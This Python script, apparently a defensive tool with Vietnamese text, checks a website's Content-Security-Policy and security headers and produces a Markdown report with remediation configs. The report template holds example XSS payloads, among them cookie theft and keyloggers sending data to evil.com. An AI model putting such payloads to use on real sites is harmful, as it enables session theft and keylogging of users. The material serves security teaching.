#!/usr/bin/env python3
"""
.\scanCSP.py
Content Security Policy (CSP) Scanner & Report Generator
Quét lỗi thiếu hoặc cấu hình sai Content-Security-Policy header
và tạo báo cáo chi tiết về các vấn đề bảo mật
"""

import requests
import sys
from datetime import datetime
from urllib.parse import urlparse
import re

class CSPSecurityScanner:
    def __init__(self, url):
        self.url = self.normalize_url(url)
        self.domain = urlparse(self.url).netloc
        self.scan_time = datetime.now()
        self.results = {}
        
    def normalize_url(self, url):
        """Chuẩn hóa URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def scan_csp(self):
        """Quét Content Security Policy"""
        print(f"\n{'='*70}")
        print(f"🔍 ĐANG QUÉT: {self.url}")
        print(f"{'='*70}\n")
        
        try:
            # Test GET request để lấy headers
            print("📤 Test 1: Gửi GET request để kiểm tra CSP headers...")
            response = requests.get(self.url, timeout=10, allow_redirects=True)
            
            self.results['status_code'] = response.status_code
            self.results['headers'] = dict(response.headers)
            
            # Kiểm tra Content-Security-Policy
            csp = response.headers.get('Content-Security-Policy', None)
            csp_report_only = response.headers.get('Content-Security-Policy-Report-Only', None)
            
            self.results['csp'] = csp
            self.results['csp_report_only'] = csp_report_only
            
            print(f"   ✓ Status Code: {response.status_code}")
            print(f"   ✓ CSP Header: {csp[:100] + '...' if csp and len(csp) > 100 else csp or '❌ KHÔNG CÓ'}")
            print(f"   ✓ CSP-Report-Only: {csp_report_only or '❌ Không có'}")
            
            # Parse CSP directives
            if csp:
                print("\n📤 Test 2: Phân tích các CSP directives...")
                self.results['csp_directives'] = self.parse_csp(csp)
                self.analyze_csp_directives()
            else:
                print("\n❌ KHÔNG CÓ CSP HEADER - Website dễ bị tấn công XSS!")
                self.results['csp_directives'] = {}
            
            # Kiểm tra các headers bảo mật khác
            print("\n📤 Test 3: Kiểm tra các security headers liên quan...")
            self.check_related_headers()
            
            # Phân tích rủi ro
            self.analyze_risk()
            
            print(f"\n{'='*70}")
            print(f"✅ QUÉT HOÀN TẤT")
            print(f"{'='*70}\n")
            
            return True
            
        except requests.exceptions.Timeout:
            print(f"❌ TIMEOUT - Không thể kết nối")
            return False
        except requests.exceptions.ConnectionError:
            print(f"❌ CONNECTION ERROR")
            return False
        except Exception as e:
            print(f"❌ LỖI: {str(e)}")
            return False
    
    def parse_csp(self, csp_header):
        """Parse CSP header thành dictionary"""
        directives = {}
        parts = csp_header.split(';')
        
        for part in parts:
            part = part.strip()
            if not part:
                continue
            
            tokens = part.split()
            if tokens:
                directive_name = tokens[0]
                directive_values = tokens[1:] if len(tokens) > 1 else []
                directives[directive_name] = directive_values
                
                # In ra từng directive
                print(f"   ✓ {directive_name}: {' '.join(directive_values) if directive_values else '(empty)'}")
        
        return directives
    
    def analyze_csp_directives(self):
        """Phân tích các CSP directives"""
        directives = self.results.get('csp_directives', {})
        
        # Các directive quan trọng cần kiểm tra
        important_directives = {
            'default-src': 'Nguồn mặc định cho tất cả tài nguyên',
            'script-src': 'Nguồn cho JavaScript',
            'style-src': 'Nguồn cho CSS',
            'img-src': 'Nguồn cho hình ảnh',
            'font-src': 'Nguồn cho fonts',
            'connect-src': 'Nguồn cho AJAX/WebSocket',
            'frame-src': 'Nguồn cho iframes',
            'frame-ancestors': 'Kiểm soát ai có thể nhúng trang',
            'object-src': 'Nguồn cho plugins (Flash, etc)',
            'base-uri': 'Giới hạn URL trong <base>',
            'form-action': 'Nguồn cho form submissions'
        }
        
        self.results['missing_directives'] = []
        self.results['weak_directives'] = []
        self.results['good_directives'] = []
        
        print("\n   📋 Phân tích chi tiết:")
        
        for directive, description in important_directives.items():
            if directive in directives:
                values = directives[directive]
                
                # Kiểm tra các giá trị nguy hiểm
                if "'unsafe-inline'" in values or "'unsafe-eval'" in values or '*' in values:
                    self.results['weak_directives'].append({
                        'directive': directive,
                        'values': values,
                        'issue': 'Có giá trị không an toàn'
                    })
                    print(f"   ⚠️  {directive}: YẾU - {description}")
                else:
                    self.results['good_directives'].append(directive)
                    print(f"   ✅ {directive}: TỐT - {description}")
            else:
                self.results['missing_directives'].append(directive)
                print(f"   ❌ {directive}: THIẾU - {description}")
    
    def check_related_headers(self):
        """Kiểm tra các security headers liên quan"""
        headers = self.results['headers']
        
        related_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY hoặc SAMEORIGIN',
            'Strict-Transport-Security': 'max-age=31536000',
            'Referrer-Policy': 'no-referrer hoặc strict-origin',
            'Permissions-Policy': 'camera=(), microphone=(), geolocation=()'
        }
        
        self.results['related_headers'] = {}
        
        for header, expected in related_headers.items():
            value = headers.get(header)
            self.results['related_headers'][header] = value
            
            if value:
                print(f"   ✅ {header}: {value[:50]}")
            else:
                print(f"   ❌ {header}: THIẾU (nên có: {expected})")
    
    def analyze_risk(self):
        """Phân tích mức độ rủi ro"""
        csp = self.results.get('csp')
        directives = self.results.get('csp_directives', {})
        
        self.results['is_vulnerable'] = False
        self.results['risk_level'] = 'Low'
        self.results['cvss_score'] = 0.0
        self.results['protection_score'] = 0
        
        score = 0
        issues = []
        protections = []
        
        # Kiểm tra có CSP không
        if not csp:
            self.results['is_vulnerable'] = True
            self.results['risk_level'] = 'High'
            self.results['cvss_score'] = 6.1
            self.results['assessment'] = '🔴 DỄ BỊ TẤN CÔNG XSS - Không có CSP header'
            issues.append("Thiếu hoàn toàn Content-Security-Policy header")
        else:
            # CSP có tồn tại, kiểm tra chất lượng
            score += 30  # Cơ bản có CSP
            
            # Kiểm tra default-src
            if 'default-src' in directives:
                score += 10
                protections.append("Có default-src directive")
                
                values = directives['default-src']
                if "'self'" in values and '*' not in values:
                    score += 10
                    protections.append("default-src được cấu hình an toàn")
                elif '*' in values:
                    issues.append("default-src cho phép tất cả nguồn (*) - rất nguy hiểm")
            else:
                issues.append("Thiếu default-src directive")
            
            # Kiểm tra script-src
            if 'script-src' in directives:
                score += 15
                values = directives['script-src']
                
                if "'unsafe-inline'" in values:
                    issues.append("script-src cho phép 'unsafe-inline' - dễ bị XSS")
                elif "'unsafe-eval'" in values:
                    issues.append("script-src cho phép 'unsafe-eval' - rủi ro trung bình")
                else:
                    score += 15
                    protections.append("script-src không có unsafe directives")
            else:
                issues.append("Thiếu script-src directive")
            
            # Kiểm tra frame-ancestors
            if 'frame-ancestors' in directives:
                score += 10
                protections.append("Có frame-ancestors (chống Clickjacking)")
            else:
                issues.append("Thiếu frame-ancestors (dễ bị Clickjacking)")
            
            # Kiểm tra object-src
            if 'object-src' in directives:
                values = directives['object-src']
                if "'none'" in values:
                    score += 10
                    protections.append("object-src được disable (chống plugin attacks)")
            
            # Đánh giá tổng thể
            if score >= 70:
                self.results['is_vulnerable'] = False
                self.results['risk_level'] = 'Low'
                self.results['cvss_score'] = 2.0
                self.results['assessment'] = '✅ CSP ĐƯỢC CẤU HÌNH TỐT - Có bảo vệ cơ bản'
            elif score >= 40:
                self.results['is_vulnerable'] = True
                self.results['risk_level'] = 'Medium'
                self.results['cvss_score'] = 4.3
                self.results['assessment'] = '⚠️ CSP YẾU - Cần tăng cường'
            else:
                self.results['is_vulnerable'] = True
                self.results['risk_level'] = 'High'
                self.results['cvss_score'] = 5.8
                self.results['assessment'] = '🔴 CSP RẤT YẾU - Gần như không có bảo vệ'
        
        self.results['protection_score'] = min(score, 100)
        self.results['issues'] = issues
        self.results['protections'] = protections
    
    def generate_markdown_report(self):
        """Tạo báo cáo Markdown chi tiết"""
        
        report = f"""# 🛡️ Phân biệt kỹ thuật: "Content Security Policy (CSP) Not Implemented"

**Ngày phân tích:** {self.scan_time.strftime('%d/%m/%Y %H:%M:%S')}  
**Website:** {self.url}  
**Domain:** {self.domain}  
**Phân loại:** {"🔴 Vulnerability Detected" if self.results['is_vulnerable'] else "✅ Protected"}

---

## 🚀 Quick Test Commands (Copy & Paste)

### Test nhanh bằng curl (10 giây):

```bash
# Test CSP header
curl -I {self.url} | grep -i "content-security-policy"

# Test đầy đủ các security headers
curl -I {self.url} | grep -i "content-security\\|x-frame\\|x-content-type"
```

**Kết quả tốt (có CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'
```

**Kết quả xấu (không có CSP):**
```
(không có output - thiếu CSP header)
```

### Verify sau khi fix:

```bash
# 1. Kiểm tra CSP header
curl -I {self.url} | grep -i "content-security-policy"

# 2. Test bằng online tool
# https://csp-evaluator.withgoogle.com/
# https://securityheaders.com/?q={self.url}

# 3. Scan lại bằng tool này
python3 scanCSP.py {self.url}
```

---

## 📚 1. Tham chiếu chuẩn kỹ thuật

- **OWASP Top 10 2021:** A05:2021 – Security Misconfiguration
- **CWE-693:** Protection Mechanism Failure
- **CSP Level 3:** W3C Recommendation
- **OWASP Secure Headers Project:** Content-Security-Policy

### CSP là gì?

**Content Security Policy (CSP)** là cơ chế bảo mật giúp phát hiện và giảm thiểu các cuộc tấn công:
- **XSS (Cross-Site Scripting)** - Tấn công chèn script độc
- **Data Injection** - Chèn dữ liệu độc hại
- **Code Injection** - Thực thi mã không mong muốn

CSP hoạt động bằng cách cho phép website chỉ định **nguồn tin cậy** mà trình duyệt được phép tải tài nguyên.

**Ví dụ:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net
```
→ Chỉ cho phép tải script từ cùng domain hoặc từ cdn.jsdelivr.net

---

## 🧪 2. Kết quả kiểm tra thực tế

### Test 1: GET Request & Headers

```bash
curl -I {self.url}
```

**Phản hồi:**

```http
HTTP/1.1 {self.results['status_code']} {self._get_status_text(self.results['status_code'])}
"""

        # Thêm headers quan trọng
        important_headers = ['Server', 'Content-Security-Policy', 'Content-Security-Policy-Report-Only',
                            'X-Content-Type-Options', 'X-Frame-Options', 'Strict-Transport-Security']
        
        for header in important_headers:
            if header in self.results['headers']:
                value = self.results['headers'][header]
                if len(value) > 100:
                    value = value[:97] + "..."
                report += f"{header}: {value}\n"
            else:
                if header in ['Content-Security-Policy', 'X-Frame-Options', 'X-Content-Type-Options']:
                    report += f"{header}: ❌ KHÔNG CÓ\n"
        
        report += "```\n\n"
        
        # Phân tích CSP
        if self.results.get('csp'):
            report += "### ✅ CSP Header được tìm thấy\n\n"
            report += f"**Full CSP Header:**\n```\n{self.results['csp']}\n```\n\n"
            
            report += "### 📋 Các CSP Directives:\n\n"
            report += "| Directive | Values | Status |\n"
            report += "|-----------|--------|--------|\n"
            
            directives = self.results.get('csp_directives', {})
            for directive, values in directives.items():
                values_str = ' '.join(values) if values else '(empty)'
                
                # Check if weak
                is_weak = any(unsafe in values for unsafe in ["'unsafe-inline'", "'unsafe-eval'", '*'])
                status = "⚠️ YẾU" if is_weak else "✅ TỐT"
                
                report += f"| `{directive}` | `{values_str}` | {status} |\n"
        else:
            report += "### ❌ KHÔNG CÓ CSP HEADER\n\n"
            report += "**Rủi ro:** Website không có bất kỳ CSP protection nào!\n\n"
        
        report += """
---

## 📊 3. So sánh: Có CSP vs Không có CSP

### ❌ Trường hợp KHÔNG CÓ CSP (nguy hiểm):

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/html
(Không có Content-Security-Policy header)
```

**Rủi ro thực tế:**

1. **XSS Attack - Tấn công chèn script:**
   ```javascript
   // Attacker có thể chèn script độc vào comment/input
   <script>
     // Đánh cắp cookie
     fetch('https://evil.com?cookie=' + document.cookie);
     
     // Hoặc keylogging
     document.addEventListener('keypress', e => {
       fetch('https://evil.com/log?key=' + e.key);
     });
   </script>
   ```

2. **Data Exfiltration:**
   - Attacker có thể tải script từ bất kỳ nguồn nào
   - Đánh cắp dữ liệu nhạy cảm (token, password, thông tin cá nhân)

3. **Malicious Redirect:**
   - Chuyển hướng người dùng đến trang phishing
   - Tải malware từ CDN độc hại

"""
        
        # Trường hợp hiện tại
        if self.results.get('csp'):
            report += f"""### ✅ Trường hợp HIỆN TẠI (có CSP):

```http
HTTP/1.1 {self.results['status_code']} {self._get_status_text(self.results['status_code'])}
Content-Security-Policy: {self.results['csp'][:100]}...
```

**Bảo vệ hiện tại:**
"""
            for prot in self.results.get('protections', []):
                report += f"- ✅ {prot}\n"
            
            if self.results.get('issues'):
                report += "\n**Vấn đề cần khắc phục:**\n"
                for issue in self.results['issues']:
                    report += f"- ⚠️ {issue}\n"
        else:
            report += f"""### 🔴 Trường hợp HIỆN TẠI (KHÔNG có CSP):

```http
HTTP/1.1 {self.results['status_code']} {self._get_status_text(self.results['status_code'])}
(Không có Content-Security-Policy header)
```

**Vấn đề:**
- 🔴 Website hoàn toàn không được bảo vệ khỏi XSS
- 🔴 Attacker có thể tải script từ bất kỳ nguồn nào
- 🔴 Không kiểm soát được nguồn tài nguyên
"""
        
        report += """

---

## 🎯 4. Demo tấn công XSS khi không có CSP

### Kịch bản 1: Reflected XSS

```html
<!-- Website vulnerable (không có CSP) -->
<!-- URL: https://victim.com/search?q=<script>alert('XSS')</script> -->

<!-- Attacker gửi link độc hại: -->
https://victim.com/search?q=<script>
  fetch('https://evil.com/steal?data=' + document.cookie)
</script>

<!-- Khi người dùng click, cookie bị đánh cắp ngay lập tức -->
```

### Kịch bản 2: Stored XSS

```html
<!-- Attacker post comment với script độc -->
<img src=x onerror="
  // Keylogger
  document.onkeypress = function(e) {
    fetch('https://evil.com/log', {
      method: 'POST',
      body: JSON.stringify({key: e.key})
    });
  }
">

<!-- Tất cả user xem comment đều bị keylog -->
```

### Kịch bản 3: DOM-based XSS

```javascript
// Code vulnerable
const searchTerm = window.location.hash.substring(1);
document.getElementById('result').innerHTML = searchTerm;

// Attacker tạo URL:
https://victim.com/#<img src=x onerror="fetch('https://evil.com/cookie?'+document.cookie)">
```

**Với CSP được cấu hình đúng → TẤT CẢ CÁC TẤN CÔNG TRÊN BỊ CHẶN**

---

## 📋 5. Bảng đánh giá bảo vệ

| Tiêu chí | Kết quả | Đánh giá | Điểm |
|----------|---------|----------|------|
"""
        
        # CSP Status
        if self.results.get('csp'):
            report += f"| CSP Header | ✅ CÓ | Có header CSP | 30/30 |\n"
        else:
            report += f"| CSP Header | ❌ KHÔNG | Thiếu hoàn toàn | 0/30 |\n"
        
        # default-src
        directives = self.results.get('csp_directives', {})
        if 'default-src' in directives:
            values = directives['default-src']
            is_safe = "'self'" in values and '*' not in values
            score = 20 if is_safe else 5
            status = "✅ An toàn" if is_safe else "⚠️ Yếu"
            report += f"| default-src | ✅ CÓ | {status} | {score}/20 |\n"
        else:
            report += f"| default-src | ❌ THIẾU | Cần có | 0/20 |\n"
        
        # script-src
        if 'script-src' in directives:
            values = directives['script-src']
            has_unsafe = "'unsafe-inline'" in values or "'unsafe-eval'" in values
            score = 10 if not has_unsafe else 5
            status = "⚠️ Có unsafe" if has_unsafe else "✅ An toàn"
            report += f"| script-src | ✅ CÓ | {status} | {score}/25 |\n"
        else:
            report += f"| script-src | ❌ THIẾU | Rất quan trọng | 0/25 |\n"
        
        # frame-ancestors
        if 'frame-ancestors' in directives:
            report += f"| frame-ancestors | ✅ CÓ | Chống Clickjacking | 10/10 |\n"
        else:
            report += f"| frame-ancestors | ❌ THIẾU | Khuyến nghị có | 0/10 |\n"
        
        # object-src
        if 'object-src' in directives:
            values = directives['object-src']
            is_none = "'none'" in values
            score = 10 if is_none else 5
            status = "✅ Disabled" if is_none else "⚠️ Enabled"
            report += f"| object-src | ✅ CÓ | {status} | {score}/10 |\n"
        else:
            report += f"| object-src | ❌ THIẾU | Nên disable | 0/10 |\n"
        
        score = self.results['protection_score']
        report += f"\n**Tổng điểm bảo vệ:** {score}/100\n\n"
        
        if score >= 70:
            report += "✅ **Đánh giá:** BẢO VỆ TỐT - CSP được cấu hình đúng\n"
        elif score >= 40:
            report += "⚠️ **Đánh giá:** BẢO VỆ TRUNG BÌNH - Cần tăng cường\n"
        elif score > 0:
            report += "🔴 **Đánh giá:** BẢO VỆ YẾU - CSP có nhưng không hiệu quả\n"
        else:
            report += "🔴 **Đánh giá:** KHÔNG CÓ BẢO VỆ - Thiếu hoàn toàn CSP\n"
        
        if self.results.get('issues'):
            report += f"\n### Vấn đề phát hiện:\n\n"
            for issue in self.results['issues']:
                report += f"- ❌ {issue}\n"
        
        if self.results.get('protections'):
            report += f"\n### Điểm mạnh:\n\n"
            for prot in self.results['protections']:
                report += f"- ✅ {prot}\n"
        
        report += """

---

## 🔧 6. Biện pháp khắc phục

"""
        
        if self.results['is_vulnerable']:
            report += "### 🔴 CẦN KHẮC PHỤC NGAY\n\n"
        else:
            report += "### Biện pháp tăng cường (nếu chính sách yêu cầu)\n\n"
        
        report += """### Step 1: CSP Cơ bản (Bắt đầu ở đây)

**Nginx:**
```nginx
# /etc/nginx/sites-available/your-site
server {
    ...
    # CSP cơ bản nhất - chỉ cho phép tài nguyên từ cùng domain
    add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none';" always;
}
```

**Apache:**
```apache
# .htaccess hoặc httpd.conf
Header always set Content-Security-Policy "default-src 'self'; frame-ancestors 'none';"
```

**Next.js:**
```javascript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; frame-ancestors 'none';"
          }
        ]
      }
    ]
  }
}
```

**Express.js:**
```javascript
// app.js
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    frameAncestors: ["'none'"]
  }
}));
```

### Step 2: CSP Nâng cao (Có CDN/External resources)

```nginx
# Nginx - CSP với CDN
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
" always;
```

### Step 3: CSP Report-Only (Test trước khi áp dụng)

```nginx
# Test CSP mà không block - chỉ report vi phạm
add_header Content-Security-Policy-Report-Only "
  default-src 'self';
  script-src 'self';
  report-uri /csp-violation-report;
" always;
```

**Setup report endpoint:**
```javascript
// Express.js - CSP violation reporter
app.post('/csp-violation-report', express.json({type: 'application/csp-report'}), (req, res) => {
  console.log('CSP Violation:', req.body);
  // Log to monitoring service
  res.status(204).end();
});
```

### Step 4: CSP với Nonce (Khuyến nghị cho SPA/Dynamic sites)

```javascript
// Next.js với CSP nonce
// middleware.ts
import { NextResponse } from 'next/server';
import crypto from 'crypto';

export function middleware(request) {
  const nonce = crypto.randomBytes(16).toString('base64');
  
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-${nonce}';
    object-src 'none';
    base-uri 'self';
    frame-ancestors 'none';
  `;
  
  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy', cspHeader.replace(/\\s{2,}/g, ' ').trim());
  response.headers.set('x-nonce', nonce);
  
  return response;
}
```

```jsx
// Component sử dụng nonce
import { headers } from 'next/headers';

export default function Page() {
  const nonce = headers().get('x-nonce');
  
  return (
    <>
      <script nonce={nonce}>
        {`console.log('This script is allowed');`}
      </script>
    </>
  );
}
```

### ⚠️ Lưu ý quan trọng:

1. **Test kỹ trước khi deploy:**
   ```bash
   # Dùng Report-Only mode trước
   curl -I your-site.com | grep -i "content-security-policy-report-only"
   ```

2. **Kiểm tra không ảnh hưởng tính năng:**
   - Inline scripts sẽ bị block → Dùng nonce hoặc chuyển ra external files
   - Google Analytics, Facebook Pixel → Thêm domain vào script-src
   - YouTube embed → Thêm vào frame-src

3. **Common pitfalls:**
   ```nginx
   # ❌ SAI - Quá mở
   Content-Security-Policy: default-src *;
   
   # ❌ SAI - Unsafe
   Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval';
   
   # ✅ ĐÚNG - Strict nhưng functional
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xxx';
   ```

---

## ✅ 7. Kiểm tra lại sau khi khắc phục

### Bước 1: Kiểm tra bằng curl

```bash
# Kiểm tra CSP header
curl -I """ + self.url + """ | grep -i "content-security-policy"
# Kết quả mong đợi: Content-Security-Policy: default-src 'self'...
```

### Bước 2: Test với Browser DevTools

1. Mở """ + self.url + """ trong Chrome
2. F12 → Console
3. Thử chạy inline script:
```javascript
// Nếu CSP hoạt động, sẽ bị block với lỗi:
eval('alert("test")'); 
// ❌ Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source
```

4. Kiểm tra Network tab:
   - Reload trang
   - Click vào request đầu tiên
   - Tab "Headers" → tìm "Content-Security-Policy"

### Bước 3: Test với online tools

```bash
# Google CSP Evaluator
https://csp-evaluator.withgoogle.com/

# Copy CSP header vào và kiểm tra
# Tool sẽ highlight các vấn đề và đề xuất cải thiện

# SecurityHeaders.com
https://securityheaders.com/?q=""" + self.url + """

# Mozilla Observatory
https://observatory.mozilla.org/analyze/""" + self.domain + """
```

### Bước 4: Test report endpoint (nếu có)

```bash
# Tạo test violation
curl -X POST """ + self.url + """/csp-violation-report \\
  -H "Content-Type: application/csp-report" \\
  -d '{
    "csp-report": {
      "blocked-uri": "https://evil.com/script.js",
      "violated-directive": "script-src"
    }
  }'

# Kiểm tra logs xem có nhận được report không
```

### Bước 5: Scan lại bằng tool này

```bash
python3 scanCSP.py """ + self.url + """
# Điểm protection score phải >= 70
```

---

## 📊 8. Kết luận và khuyến nghị

### Đánh giá tổng quan:

"""
        
        if self.results['is_vulnerable']:
            report += f"""🔴 **Website CÓ LỖ HỔNG CSP**

**Điểm bảo vệ:** {self.results['protection_score']}/100
**Mức độ rủi ro:** {self.results['risk_level']}
**CVSS Score:** {self.results['cvss_score']}

**Vấn đề phát hiện:**
"""
            for issue in self.results.get('issues', []):
                report += f"- ❌ {issue}\n"
            
            report += """
**Tác động:**
- Dễ bị tấn công XSS (Cross-Site Scripting)
- Attacker có thể inject và thực thi script độc
- Đánh cắp cookie, session token, thông tin nhạy cảm
- Vi phạm OWASP Top 10 (A05:2021)

**Hành động khuyến nghị:**
1. 🔴 **KHẨN CẤP** - Triển khai CSP ngay (Step 1 → Step 2 trong mục 6)
2. 🧪 **TEST KỸ** - Dùng Report-Only mode trước khi enable chính thức
3. ✅ **VERIFY** - Scan lại bằng tool và online services
4. 📊 **MONITOR** - Setup CSP violation reporting
"""
        else:
            report += f"""✅ **Website ĐÃ CÓ CSP**

**Điểm bảo vệ:** {self.results['protection_score']}/100
**Mức độ rủi ro:** {self.results['risk_level']}

**Bảo vệ hiện tại:**
"""
            for prot in self.results.get('protections', []):
                report += f"- ✅ {prot}\n"
            
            report += """
**Đánh giá:**
- Website có CSP header
- Có bảo vệ cơ bản chống XSS
"""
            
            if self.results['protection_score'] < 70:
                report += """
**Cần tăng cường:**
"""
                for issue in self.results.get('issues', []):
                    report += f"- ⚠️ {issue}\n"
                
                report += """
**Hành động khuyến nghị:**
1. ⚠️ **CẢI THIỆN** - Xử lý các vấn đề trên
2. 🔍 **REVIEW** - Kiểm tra lại CSP directives
3. 📊 **MONITOR** - Theo dõi CSP violations
"""
            else:
                report += """
**Hành động khuyến nghị:**
1. ✅ **MAINTAIN** - Duy trì cấu hình hiện tại
2. 📊 **MONITOR** - Theo dõi CSP violation reports
3. 🔄 **UPDATE** - Review quarterly khi thêm tính năng mới
"""
        
        report += """

---

## 📖 9. CSP Directives Reference

### Các directive quan trọng:

| Directive | Mô tả | Ví dụ |
|-----------|-------|-------|
| `default-src` | Nguồn mặc định cho tất cả | `'self'` |
| `script-src` | Nguồn cho JavaScript | `'self' https://cdn.com` |
| `style-src` | Nguồn cho CSS | `'self' 'unsafe-inline'` |
| `img-src` | Nguồn cho images | `'self' data: https:` |
| `font-src` | Nguồn cho fonts | `'self' https://fonts.gstatic.com` |
| `connect-src` | Nguồn cho AJAX/WebSocket | `'self' https://api.com` |
| `frame-src` | Nguồn cho iframes | `'self' https://youtube.com` |
| `frame-ancestors` | Ai được phép embed | `'none'` hoặc `'self'` |
| `object-src` | Nguồn cho plugins | `'none'` (khuyến nghị) |
| `base-uri` | Giới hạn <base> element | `'self'` |
| `form-action` | Nguồn cho form submit | `'self'` |

### Các keyword đặc biệt:

- `'none'` - Không cho phép bất kỳ nguồn nào
- `'self'` - Chỉ cho phép cùng origin
- `'unsafe-inline'` - Cho phép inline scripts (KHÔNG KHUYẾN NGHỊ)
- `'unsafe-eval'` - Cho phép eval() (KHÔNG KHUYẾN NGHỊ)
- `'strict-dynamic'` - Tin tưởng scripts được load bởi trusted scripts
- `'nonce-xxx'` - Chỉ cho phép scripts với nonce này
- `'sha256-xxx'` - Chỉ cho phép scripts với hash này

---

## 🔗 References

- [CSP Level 3 Spec](https://www.w3.org/TR/CSP3/)
- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google CSP Guide](https://web.dev/csp/)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

**Prepared by:** CSP Security Scanner  
**Scan Time:** """ + self.scan_time.strftime('%Y-%m-%d %H:%M:%S') + """  
**Report Version:** 1.0  
**Tool Version:** 1.0.0
"""
        
        return report
    
    def _get_status_text(self, code):
        """Lấy text mô tả status code"""
        status_texts = {
            200: "OK",
            301: "Moved Permanently",
            302: "Found",
            403: "Forbidden",
            404: "Not Found",
            500: "Internal Server Error"
        }
        return status_texts.get(code, "Unknown")
    
    def save_report(self, filename=None):
        """Lưu báo cáo ra file"""
        if filename is None:
            timestamp = self.scan_time.strftime('%Y%m%d_%H%M%S')
            filename = f"csp_report_{self.domain}_{timestamp}.md"
        
        report_content = self.generate_markdown_report()
        
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(report_content)
            
            print(f"✅ Đã lưu báo cáo: {filename}")
            return filename
        except Exception as e:
            print(f"❌ Lỗi khi lưu file: {str(e)}")
            return None

def main():
    print("="*70)
    print("🛡️  CONTENT SECURITY POLICY (CSP) SCANNER")
    print("="*70)
    print("Công cụ quét lỗi thiếu CSP và tạo báo cáo chi tiết")
    print("="*70 + "\n")
    
    # Lấy URL
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = input("🔍 Nhập URL cần quét: ").strip()
    
    if not url:
        print("❌ Vui lòng nhập URL!")
        return
    
    # Khởi tạo scanner
    scanner = CSPSecurityScanner(url)
    
    # Chạy scan
    success = scanner.scan_csp()
    
    if not success:
        print("❌ Quét thất bại!")
        return
    
    # Hiển thị tóm tắt
    print("\n" + "="*70)
    print("📊 TÓM TẮT KẾT QUẢ")
    print("="*70)
    print(f"Website: {scanner.url}")
    print(f"Đánh giá: {scanner.results['assessment']}")
    print(f"Mức độ rủi ro: {scanner.results['risk_level']}")
    print(f"Điểm bảo vệ: {scanner.results['protection_score']}/100")
    print(f"CVSS Score: {scanner.results['cvss_score']}")
    
    print("\n" + "-"*70)
    if scanner.results['is_vulnerable']:
        print("🔴 PHÁT HIỆN LỖ HỔNG - Cần khắc phục!")
        print("\nVấn đề:")
        for issue in scanner.results.get('issues', []):
            print(f"  ❌ {issue}")
    else:
        print("✅ AN TOÀN - Đã có CSP protection!")
        if scanner.results.get('protections'):
            print("\nĐiểm mạnh:")
            for prot in scanner.results.get('protections', []):
                print(f"  ✅ {prot}")
        
        if scanner.results.get('issues'):
            print("\nCần cải thiện:")
            for issue in scanner.results.get('issues', []):
                print(f"  ⚠️ {issue}")
    
    print("="*70 + "\n")
    
    # Hỏi có muốn lưu báo cáo không
    save = input("💾 Bạn có muốn lưu báo cáo chi tiết? (y/n): ").strip().lower()
    
    if save in ['y', 'yes', 'có']:
        custom_name = input("📝 Nhập tên file (Enter để dùng tên mặc định): ").strip()
        filename = custom_name if custom_name else None
        
        saved_file = scanner.save_report(filename)
        
        if saved_file:
            print(f"\n✅ Hoàn tất! Xem báo cáo tại: {saved_file}")
            print(f"\n💡 Mở file bằng: ")
            print(f"   - VS Code: code {saved_file}")
            print(f"   - Notepad: notepad {saved_file}")
            print(f"   - Hoặc mở bằng Markdown viewer")
    else:
        print("\n📋 Báo cáo không được lưu.")
    
    # Hướng dẫn tiếp theo
    print("\n" + "="*70)
    print("🎯 BƯỚC TIẾP THEO")
    print("="*70)
    
    if scanner.results['is_vulnerable']:
        print("""
1. Đọc kỹ phần "Biện pháp khắc phục" trong báo cáo
2. Bắt đầu với Step 1 (CSP cơ bản)
3. Test bằng Report-Only mode trước
4. Verify với online tools: https://csp-evaluator.withgoogle.com/
5. Scan lại để confirm đã fix thành công

⚠️  LƯU Ý: Test kỹ trên staging trước khi deploy production!
        """)
    else:
        print("""
1. Review các vấn đề cần cải thiện (nếu có)
2. Setup CSP violation reporting
3. Monitor logs định kỳ
4. Update CSP khi thêm external resources mới
5. Quarterly security scan để đảm bảo CSP vẫn hiệu quả
        """)
    
    print("="*70 + "\n")

if __name__ == "__main__":
    main()
